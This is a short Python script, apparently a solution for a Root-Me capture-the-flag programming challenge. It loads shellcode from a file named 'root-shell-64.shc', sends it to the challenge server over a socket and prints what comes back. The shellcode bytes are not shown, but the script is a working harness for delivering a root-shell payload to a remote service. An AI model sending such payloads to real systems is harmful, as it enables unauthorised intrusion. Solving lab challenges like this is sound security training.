#!/usr/bin/python3 

import socket, sys

with open("test/root-shell-64.shc", "rb") as f:
    shellcode = f.read()

print("(+) Shellcode loaded:\n{}\n".format(shellcode))

hostname = "challenge01.root-me.org"
port = 52010
username = "programmation-ch10"
password = username

print("(+) Connecting to {}:{}@{}:{}\n".format(username, password, hostname, port))
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((hostname, port))
s.send(shellcode)

output = s.recv(2048).decode("ascii")

while len(output) > 0:
    sys.stdout.write(output)
    output = s.recv(2048).decode("ascii")

s.close()
print("\n(-) Connection closed")
